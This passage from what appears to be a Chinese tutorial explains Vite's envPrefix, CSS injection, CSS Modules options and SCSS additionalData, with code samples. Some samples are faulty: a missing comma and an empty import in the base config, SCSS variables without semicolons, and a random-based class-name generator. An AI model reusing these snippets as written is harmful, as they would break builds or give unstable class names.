<li><strong><code>envPrefix</code> 配置项</strong>：指定客户端可访问的环境变量前缀（默认为 <code>VITE_</code>）。只有带此前缀的变量会被注入到 <code>import.meta.env</code>，确保非必要变量不暴露给客户端。</li>
</ul>
<p>所以我们需要在公共的配置文件中添加配置项</p>
<p><code>vite.base.config.js</code>:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> <span class="hljs-variable constant_">URL</span> <span class="hljs-keyword">from</span> <span class="hljs-string">''</span>
<span class="hljs-comment">// 基础公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">envDir</span>: <span class="hljs-string">'./config/env'</span> <span class="hljs-comment">// 指定环境变量的加载目录</span>
    <span class="hljs-attr">envPrefix</span>:<span class="hljs-string">''</span>, <span class="hljs-comment">// 前缀过滤</span>
})
</code></pre>
<h3 data-id="heading-21">Vite对css的模块化处理</h3>
<h4 data-id="heading-22">vite默认识别文件的方式</h4>
<ul>
<li>新建<code>index.css</code>文件，在main.js中引入<code>import 'index.css'</code></li>
</ul>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-id">#app</span> {
    <span class="hljs-attribute">background-color</span>: pink;
    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
}
</code></pre>
<p>效果：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2223c5014004460faedd53d111813ce1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=71MCGF2PtN0aoy%2Bc9ddBL00USvU%3D" alt="" loading="lazy"/></p>
<p>我们发现了，在<code>head</code>标签里面新建了一个<code>style</code>标签，index.css 文件里里面的内容，都被写到了标签里面。</p>
<p>当 <strong>Vite</strong> 的开发服务器检测到 main.js 中导入了 index.css 时，会对该 CSS 文件进行特殊处理：它会将 CSS 内容转换为一个 JavaScript 模块，并在响应头中设置 <code>Content-Type: text/javascript</code>，浏览器就会认为这是一个 JS 脚本，从而让浏览器以js脚本的形式来加载后缀名为<code>.css</code>的文件。浏览器加载这个 JS 模块后，会执行其中的逻辑 —— 动态创建 <code>&lt;style&gt;</code> 标签，并将原本的 CSS 内容插入到该标签中，最终使样式生效。</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43da02d0b0314d22ae471bd8b4948612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=8tzLcipvh%2Bl1hSHEs%2FHoAtvDqrg%3D" loading="lazy"/>
<p>转化为js脚本来加载CSS，主要有以下几个好处：</p>
<ul>
<li>用于<code>热更新</code>。</li>
<li>用于<code>css</code>模块化。</li>
<li>通过ESM 原生加载和避免开发时打包，提高了编译性能。</li>
</ul>
<h4 data-id="heading-23">CSS模块化</h4>
<p>CSS 模块化（CSS Modules）是一种用于解决传统 CSS 的 “全局作用域” 问题，即当多个文件中出现同名类名时，后加载的样式会覆盖先加载的样式，导致样式冲突。</p>
<p><strong>普通 CSS 文件（非模块化，如 <code>style.css</code>）</strong></p>
<p>类名会被<strong>原样保留</strong>，属于全局作用域，具体处理逻辑：</p>
<ol>
<li>开发环境：Vite 将 CSS 内容通过动态创建的 <code>&lt;style&gt;</code> 标签注入到页面，类名直接生效（如 <code>.title</code> 会被浏览器解析为全局类名）。</li>
<li>生产环境：CSS 会被提取为独立文件，类名保持原样，加载后仍为全局作用域。</li>
</ol>
<p><strong>特点</strong>：多个文件中的同名类名会发生冲突（后加载的样式覆盖先加载的）。</p>
<p><strong>CSS 模块化文件（如 <code>style.module.css</code>）</strong></p>
<p>类名会被<strong>哈希化处理</strong>，生成唯一标识，限制在局部作用域，具体流程：</p>
<p><strong>Vite</strong>会对后缀名为<code>.module.css</code>进行模块化处理。</p>
<ol>
<li><strong>类名转换</strong>：Vite 会对模块化 CSS 中的类名进行哈希处理（如 <code>.title</code> → <code>title_1a2b3c</code>），确保全局唯一，避免冲突。
<ul>
<li>转换规则可通过 Vite 配置自定义（如 <code>[name]__[local]___[hash]</code>，其中 <code>name</code> 是文件名，<code>local</code> 是原类名）。</li>
</ul>
</li>
<li><strong>在 JS 中引用</strong>：导入模块化 CSS 后，会得到一个对象，键为原类名，值为哈希后的类名。</li>
</ol>
<p>创建a.js、b.js、 a.module.css、b.moudle.css四个文件分别放入如下内容</p>
<p><code>a.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> aModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"aModuleCss:"</span>,aModuleCss);
</code></pre>
<p><code>b.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> bModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"bModuleCss:"</span>,bModuleCss);
</code></pre>
<p><code>a.module.css</code></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: pink;
}
</code></pre>
<p><code>b.moudle.css</code></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: skyblue;
}
</code></pre>
<p>然后在main.js中引入 a.js和b.js文件，启动服务，查看浏览器控制台</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f518f11c1144879962606fa718e8e15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2F8OJ1H1hHgGpxwg8N6pvdEPgfDo%3D" alt="" loading="lazy"/></p>
<p>然后我们可以看到，vite创建了两个映射对象，我们写的样式会被处理成<code>key:value</code>的形式，以原类名作为键名，处理后的类名作为键值。</p>
<img alt="image-20251113222925461转存失败，建议直接上传图片文件" src="" loading="lazy"/>
<p>然后真实引入的样式的类名会被替换成处理后的键值。最后再创建两个元素添加处理后的类名，写入如下代码</p>
<p><code>a.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> aModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./a.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"aModuleCss:"</span>,aModuleCss);

<span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
div.<span class="hljs-property">className</span> = aModuleCss.<span class="hljs-property">demo</span> <span class="hljs-comment">//原类名demo作为属性名，处理后的类名作为属性值</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div)
</code></pre>
<p><code>b.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> bModuleCss <span class="hljs-keyword">from</span> <span class="hljs-string">'./b.module.css'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"bModuleCss:"</span>,bModuleCss);

<span class="hljs-keyword">const</span> div = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
div.<span class="hljs-property">className</span> = bModuleCss.<span class="hljs-property">demo</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(div)
</code></pre>
<p>效果:</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d940c9b0092d44969555f54cf25ec763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=iySUjIqbIikRRF11dvrnfDdd8CY%3D" loading="lazy"/>
<p><strong>渲染效果</strong>：在 HTML 中最终应用的是哈希后的类名（如 <code>&lt;div class="_demo_10cvw_1"&gt;</code>），并且仅对当前模块生效。</p>
<p><strong>总结</strong>：开启css模块化之后，除了会进行默认的css处理，还会进行类名替换，防止全局类名冲突</p>
<h4 data-id="heading-24">css.modules配置行为</h4>
<p>在 Vite 中，<code>css.modules</code> 配置项用于自定义 CSS Modules 的行为（CSS Modules 是一种通过局部作用域类名避免样式冲突的技术）。Vite 内置了对 CSS Modules 的支持，而 <code>css.modules</code> 就是用来精细化控制其规则的，下面详细讲解每个配置的作用、使用场景和示例：</p>
<h5 data-id="heading-25">基础前提</h5>
<p>在 Vite 中，默认约定：<strong>文件名以 <code>.module.css</code>（或 <code>.module.scss</code> 等预处理器后缀）结尾的文件会被当作 CSS Modules 处理</strong>，类名会被自动转换为局部作用域（编译成哈希字符串，如 <code>header -&gt; header_1a2b3c</code>）；非 <code>.module</code> 结尾的 CSS 文件则默认是全局作用域（类名不变）。</p>
<h5 data-id="heading-26"><code>css.modules</code> 完整配置项详解</h5>
<p>以下是 <code>vite.config.js</code> 中 <code>css.modules</code> 的所有可选配置，结合 Vite 实际使用场景说明：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CSSModulesOptions</span> {
  getJSON?: <span class="hljs-function">(<span class="hljs-params">cssFileName: <span class="hljs-built_in">string</span>,
    json: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;,
    outputFileName: <span class="hljs-built_in">string</span>,
  </span>) =&gt;</span> <span class="hljs-built_in">void</span>
  scopeBehaviour?: <span class="hljs-string">'global'</span> | <span class="hljs-string">'local'</span>
  globalModulePaths?: <span class="hljs-title class_">RegExp</span>[]
  exportGlobals?: <span class="hljs-built_in">boolean</span>
  generateScopedName?:
    | <span class="hljs-built_in">string</span>
    | (<span class="hljs-function">(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, filename: <span class="hljs-built_in">string</span>, css: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">string</span>)
  hashPrefix?: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/**
   * default: undefined
   */</span>
  localsConvention?:
    | <span class="hljs-string">'camelCase'</span>
    | <span class="hljs-string">'camelCaseOnly'</span>
    | <span class="hljs-string">'dashes'</span>
    | <span class="hljs-string">'dashesOnly'</span>
    | (<span class="hljs-function">(<span class="hljs-params">
        originalClassName: <span class="hljs-built_in">string</span>,
        generatedClassName: <span class="hljs-built_in">string</span>,
        inputFile: <span class="hljs-built_in">string</span>,
      </span>) =&gt;</span> <span class="hljs-built_in">string</span>)
}
</code></pre>
<h5 data-id="heading-27">1. <code>scopeBehaviour</code>：默认作用域行为</h5>
<ul>
<li>
<p><strong>类型</strong>：<code>'global'</code> 或 <code>'local'</code>（字符串，二选一）</p>
</li>
<li>
<p><strong>默认值</strong>：<code>'local'</code></p>
</li>
<li>
<p>作用</p>
<p>：指定 CSS Modules 文件中类名的默认作用域（全局 / 局部）。</p>
<ul>
<li><code>'local'</code>（默认）：所有类名默认是局部的（会被编译成哈希，避免冲突）。</li>
<li><code>'global'</code>：所有类名默认是全局的（不编译，和普通 CSS 一样），此时需要用 <code>:local()</code> 手动指定局部类名。</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">scopeBehaviour</span>: <span class="hljs-string">'global'</span> <span class="hljs-comment">// 默认全局，需手动用 :local() 定义局部类</span>
}
</code></pre>
<p>对应 CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 全局类（因为 scopeBehaviour 是 global） */</span>
<span class="hljs-selector-class">.title</span> { <span class="hljs-attribute">color</span>: red; }

<span class="hljs-comment">/* 局部类（手动用 :local() 标记，会被编译） */</span>
:<span class="hljs-built_in">local</span>(.content) { <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; }
</code></pre>
</li>
</ul>
<h5 data-id="heading-28">2. <code>globalModulePaths</code>：指定全局 CSS 文件路径</h5>
<ul>
<li>
<p><strong>类型</strong>：正则表达式数组（如 <code>[/\.global\.css$/]</code>）</p>
</li>
<li>
<p><strong>作用</strong>：通过正则匹配文件路径，符合规则的 <code>.module.css</code> 文件会被当作<strong>全局 CSS</strong> 处理（类名不编译），忽略 <code>.module</code> 后缀的约定。</p>
</li>
<li>
<p><strong>使用场景</strong>：需要批量将某些 <code>.module.css</code> 文件设为全局（比如第三方组件的样式）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">globalModulePaths</span>: [<span class="hljs-regexp">/node_modules/</span>]<span class="hljs-comment">// 匹配 node_modules 下的 .module.css 文件，当作全局处理</span>
  <span class="hljs-comment">// 另一个例子：匹配所有带 .global. 的文件，如 home.global.module.css</span>
  <span class="hljs-comment">// globalModulePaths: [/\.global\./]</span>
}
</code></pre>
</li>
</ul>
<h5 data-id="heading-29">3. <code>exportGlobals</code>：是否导出全局类名</h5>
<ul>
<li>
<p><strong>类型</strong>：布尔值（<code>true</code> / <code>false</code>）</p>
</li>
<li>
<p><strong>默认值</strong>：<code>false</code></p>
</li>
<li>
<p><strong>作用</strong>：如果 CSS 中用 <code>:global()</code> 定义了全局类名，是否将其导出到模块的 <code>styles</code> 对象中（方便在 JS 中引用）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: { <span class="hljs-attr">exportGlobals</span>: <span class="hljs-literal">true</span> }
</code></pre>
<p>CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 全局类 */</span>
:<span class="hljs-built_in">global</span>(.global-title) { <span class="hljs-attribute">color</span>: blue; }

<span class="hljs-comment">/* 局部类 */</span>
<span class="hljs-selector-class">.local-content</span> { <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>; }
</code></pre>
<p>JS 中引用：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.module.css'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles); 
<span class="hljs-comment">// 因为 exportGlobals: true，会包含全局类：</span>
<span class="hljs-comment">// { globalTitle: 'global-title', localContent: 'local-content_1a2b3c' }</span>
</code></pre>
<p>此时可以用 <code>className={styles.globalTitle}</code> 引用全局类。</p>
</li>
</ul>
<h5 data-id="heading-30">4. <code>generateScopedName</code>：自定义局部类名格式</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串 或 函数</p>
</li>
<li>
<p><strong>默认值</strong>：开发环境是 <code>'[name]__[local]___[hash:base64:5]'</code>（如 <code>style__content___1a2b3</code>），生产环境是短哈希（如 <code>1a2b3</code>）</p>
</li>
<li>
<p><strong>作用</strong>：自定义局部类名的编译结果（默认是哈希，可读性差，可通过此配置优化）。</p>
</li>
<li>
<p>字符串模式</p>
<p>（常用占位符）：</p>
<ul>
<li><code>[name]</code>：CSS 文件名（不含后缀）</li>
<li><code>[local]</code>：原始类名（如 <code>.content</code> 中的 <code>content</code>）</li>
<li><code>[hash:长度]</code>：哈希值（可指定长度，如 <code>[hash:6]</code> 生成 6 位哈希）</li>
<li><code>[hash:base64:长度]</code>：base64 格式的哈希</li>
</ul>
</li>
<li>
<p>函数模式：接收 3 个参数，返回自定义类名字符串：</p>
<ul>
<li><code>name</code>：原始类名</li>
<li><code>filename</code>：CSS 文件路径</li>
<li><code>css</code>：CSS 内容</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-comment">// 字符串格式：文件名__原始类名--6位哈希</span>
  <span class="hljs-attr">generateScopedName</span>: <span class="hljs-string">'[name]__[local]--[hash:6]'</span>,

  <span class="hljs-comment">// 函数格式：自定义逻辑（如添加前缀）</span>
  <span class="hljs-attr">generateScopedName</span>: <span class="hljs-function">(<span class="hljs-params">name, filename, css</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> prefix = filename.<span class="hljs-title function_">split</span>(<span class="hljs-string">'/'</span>).<span class="hljs-title function_">pop</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-string">'.module.css'</span>, <span class="hljs-string">''</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">`my-<span class="hljs-subst">${prefix}</span>-<span class="hljs-subst">${name}</span>-<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random().toString(<span class="hljs-number">36</span>).slice(<span class="hljs-number">2</span>, <span class="hljs-number">8</span>)}</span>`</span>;
  }
}
</code></pre>
<p>假设文件是<code>header.module.css</code>，类名是<code>.title</code>，编译后可能是：</p>
<ul>
<li>字符串模式：<code>header__title--1a2b3c</code></li>
<li>函数模式：<code>my-header-title-xyz789</code></li>
</ul>
</li>
</ul>
<h5 data-id="heading-31">5. <code>hashPrefix</code>：哈希前缀</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串</p>
</li>
<li>
<p><strong>作用</strong>：给生成的哈希值添加一个前缀，确保不同项目 / 环境的类名哈希不冲突（哈希计算会包含这个前缀）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: { <span class="hljs-attr">hashPrefix</span>: <span class="hljs-string">'my-project-v1'</span> }
</code></pre>
<p>此时哈希值会基于<code>my-project-v1</code>计算，避免和其他项目的哈希重复。</p>
</li>
</ul>
<h5 data-id="heading-32">6. <code>localsConvention</code>：JS 中类名的命名格式</h5>
<ul>
<li>
<p><strong>类型</strong>：字符串（<code>'camelCase'</code> / <code>'camelCaseOnly'</code> / <code>'dashes'</code> / <code>'dashesOnly'</code>）或 函数</p>
</li>
<li>
<p><strong>默认值</strong>：<code>undefined</code>（不转换，保持原始类名）</p>
</li>
<li>
<p><strong>作用</strong>：CSS 中类名常用横杠（如 <code>.user-info</code>），但 JS 中更习惯驼峰（<code>userInfo</code>），此配置用于自动转换导出到 JS 的类名格式。</p>
</li>
<li>
<p>字符串选项说明：</p>
<ul>
<li><code>'camelCase'</code>：横杠转驼峰，同时保留原始类名（如 <code>.user-info</code> 可通过 <code>styles.userInfo</code> 和 <code>styles['user-info']</code> 访问）。</li>
<li><code>'camelCaseOnly'</code>：只保留驼峰形式（<code>styles.userInfo</code> 有效，<code>styles['user-info']</code> 无效）。</li>
<li><code>'dashes'</code>：驼峰转横杠，同时保留原始类名（如 <code>.userInfo</code> 可通过 <code>styles['user-info']</code> 和 <code>styles.userInfo</code> 访问）。</li>
<li><code>'dashesOnly'</code>：只保留横杠形式（<code>styles['user-info']</code> 有效，<code>styles.userInfo</code> 无效）。</li>
</ul>
</li>
<li>
<p>函数模式：自定义转换规则，接收 3 个参数：</p>
<ul>
<li><code>originalClassName</code>：原始类名（如 <code>user-info</code>）</li>
<li><code>generatedClassName</code>：编译后的类名（如 <code>user-info_1a2b3c</code>）</li>
<li><code>inputFile</code>：CSS 文件路径</li>
</ul>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">localsConvention</span>: <span class="hljs-string">'camelCase'</span> <span class="hljs-comment">// 横杠转驼峰，保留原始</span>
}
</code></pre>
<p>CSS（<code>style.module.css</code>）：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.user-info</span> { <span class="hljs-attribute">color</span>: green; }
</code></pre>
<p>JS 中引用:</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.module.css'</span>;
<span class="hljs-comment">// 两种方式都能访问</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles.<span class="hljs-property">userInfo</span>); <span class="hljs-comment">// 有效（驼峰）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(styles[<span class="hljs-string">'user-info'</span>]); <span class="hljs-comment">// 有效（原始）</span>
</code></pre>
</li>
</ul>
<h5 data-id="heading-33">7. <code>getJSON</code>：处理类名映射关系</h5>
<ul>
<li>
<p><strong>类型</strong>：函数</p>
</li>
<li>
<p><strong>作用</strong>：当 CSS Modules 编译完成后，会生成一个 “原始类名 -&gt; 编译后类名” 的映射对象（JSON），此函数用于自定义处理这个映射（如保存到文件、打印日志等）。</p>
</li>
<li>
<p>参数：</p>
<ul>
<li><code>cssFileName</code>：原始 CSS 文件的路径（如 <code>src/style.module.css</code>）</li>
<li><code>json</code>：映射对象（如 <code>{ "user-info": "user-info_1a2b3c" }</code>）</li>
<li><code>outputFileName</code>：Vite 自动生成的映射文件路径（通常不需要手动处理）</li>
</ul>
</li>
<li>
<p><strong>使用场景</strong>：需要记录类名映射关系（如调试、自定义生成类型文件等）。</p>
</li>
<li>
<p>示例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">modules</span>: {
  <span class="hljs-attr">getJSON</span>: <span class="hljs-function">(<span class="hljs-params">cssFileName, json, outputFileName</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'CSS 文件:'</span>, cssFileName);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'类名映射:'</span>, json);
    <span class="hljs-comment">// 可以将 json 保存到本地文件（需要 fs 模块）</span>
    <span class="hljs-comment">// const fs = require('fs');</span>
    <span class="hljs-comment">// fs.writeFileSync('./class-map.json', JSON.stringify(json, null, 2));</span>
  }
}
</code></pre>
</li>
</ul>
<h5 data-id="heading-34">实际项目常用配置示例</h5>
<p>结合开发和生产环境的需求，一个典型的 <code>css.modules</code> 配置可能是这样的</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">modules</span>: {
      <span class="hljs-comment">// 开发环境下保留可读性好的类名，生产环境用短哈希</span>
      <span class="hljs-attr">generateScopedName</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'development'</span>
        ? <span class="hljs-string">'[name]__[local]--[hash:5]'</span>
        : <span class="hljs-string">'[hash:6]'</span>,
      <span class="hljs-comment">// 横杠转驼峰，方便 JS 中用 . 访问</span>
      <span class="hljs-attr">localsConvention</span>: <span class="hljs-string">'camelCase'</span>,
      <span class="hljs-comment">// 添加哈希前缀，避免冲突</span>
      <span class="hljs-attr">hashPrefix</span>: <span class="hljs-string">'my-app'</span>,
      <span class="hljs-comment">// 导出全局类名，方便引用</span>
      <span class="hljs-attr">exportGlobals</span>: <span class="hljs-literal">true</span>
    }
  }
}
</code></pre>
<h5 data-id="heading-35">总结</h5>
<p><code>css.modules</code> 配置的核心目的是：<strong>控制 CSS 类名的编译规则（局部 / 全局、格式）和 JS 中的引用方式</strong>。通过合理配置，可以让 CSS Modules 更符合项目的开发习惯，同时避免样式冲突。日常开发中，<code>generateScopedName</code>（自定义类名）和 <code>localsConvention</code>（驼峰转换）是最常用的两个配置。</p>
<h3 data-id="heading-36">css.preprocessorOptions(预处理器)</h3>
<p><code>preprocessorOptions</code> 就是给项目的 CSS 预处理器（比如 SCSS、Less）提供一个 “全局配置” 的地方。在 Vite 处理 <code>.scss</code> 或 <code>.sass</code> 文件之前，它会先读取这些配置，并应用到整个编译过程中。</p>
<h4 data-id="heading-37"><strong>作用</strong></h4>
<ol>
<li><strong>引入全局样式文件</strong>：你可能有一个 <code>variables.scss</code> 文件，里面定义了所有的颜色、字体、间距等变量；还有一个 <code>mixins.scss</code> 文件，里面是一些可复用的样式片段。你不想在每一个 <code>.scss</code> 文件的开头都写一遍 <code>@import './variables.scss';</code>，这太繁琐了。</li>
<li><strong>定义全局变量 / 混合宏</strong>：有些简单的变量或混合宏（mixin），你可能不想专门为它创建一个文件，希望能直接在所有 SCSS 文件中使用。</li>
<li><strong>修改 SCSS 编译器的行为</strong>：比如，让 SCSS 允许开发者使用 <code>@debug</code> 指令在控制台打印调试信息，或者想改变它处理 URL 的方式。</li>
</ol>
<h4 data-id="heading-38">全局配置项目中sass的行为</h4>
<p>在vite项目中使用<code>sass</code>预处理器需要先安装相关依赖</p>
<pre><code class="hljs language-cmd" lang="cmd">pnpm add sass sass-loader -D
</code></pre>
<p>安装完成后，<strong>不需要做任何其他配置</strong>。Vite 会自动检测到这些依赖，并在导入 <code>.scss</code> 或 <code>.sass</code> 文件时，自动使用它们进行编译。</p>
<h5 data-id="heading-39">**1. <code>additionalData</code> **</h5>
<p>这个属性允许你在<strong>每一个</strong>被编译的 SCSS/Sass 文件的<strong>开头</strong>，自动注入一段 SCSS 代码。</p>
<p><strong>场景一：自动引入全局样式文件</strong></p>
<p>假设你的项目结构如下：</p>
<pre><code class="hljs language-text" lang="text">src/
├── assets/
│   └── styles/
│       ├── variables.scss  // 定义了 $primary-color: #1890ff;
│       └── mixins.scss     // 定义了 @mixin flex-center { ... }
└── components/
    └── Button/
        └── index.scss
</code></pre>
<p>如果你不配置 <code>additionalData</code>，那么在 <code>Button/index.scss</code> 中，你必须这样写：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Button/index.scss</span>
<span class="hljs-keyword">@import</span> <span class="hljs-string">'../../assets/styles/variables.scss'</span>;
<span class="hljs-keyword">@import</span> <span class="hljs-string">'../../assets/styles/mixins.scss'</span>;

<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>;
  <span class="hljs-keyword">@include</span> flex-center;
}
</code></pre>
<p>如果项目大了，每个文件都要写这么一长串 <code>@import</code>，不仅麻烦，而且容易出错。</p>
<p><strong>使用 <code>additionalData</code> 后，你的 <code>vite.config.js</code> 可以这样配置：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>; <span class="hljs-comment">// 需要引入 path 模块来处理路径</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// ... 其他配置</span>
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-attr">additionalData</span>: <span class="hljs-string">`
          @import "@/assets/styles/variables.scss";
          @import "@/assets/styles/mixins.scss";
        `</span>,
      },
    },
  },
  <span class="hljs-comment">// 为了让 @/ 能正确指向 src 目录，通常需要配置 resolve</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
    },
  },
});
</code></pre>
<p><strong>注意：</strong></p>
<ul>
<li><code>@/</code> 是一个别名，代表 <code>src/</code> 目录，这需要在 <code>resolve.alias</code> 中配置。</li>
<li>引入的文件路径是相对于项目根目录的，或者相对于 <code>alias</code> 配置的路径。</li>
<li>可以把这段注入的代码想象成一个 “隐形的” 头部，自动加到了每个 <code>.scss</code> 文件的最前面。</li>
</ul>
<p>现在，你的 <code>Button/index.scss</code> 就可以变得非常干净</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// Button/index.scss</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-variable">$primary-color</span>; <span class="hljs-comment">// 直接使用，无需手动导入</span>
  <span class="hljs-keyword">@include</span> flex-center;  <span class="hljs-comment">// 直接使用</span>
}
</code></pre>
<p><strong>场景二：定义全局变量或混合宏</strong></p>
<p>如果你只有一两个简单的全局变量，不想为此创建一个文件，可以直接写在 <code>additionalData</code> 里。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-attr">additionalData</span>:  <span class="hljs-string">`
          $primary-color: #1890ff
          $secondary-color: #41b883
          $font-size-base: 16px
          $border-radius: 4px
        `</span>,
      },
    },
  },
});
</code></pre>
<p>这样，在任何 <code>.scss</code> 文件中，你都可以直接使用 <code>background: $primary-color;</code>。</p>
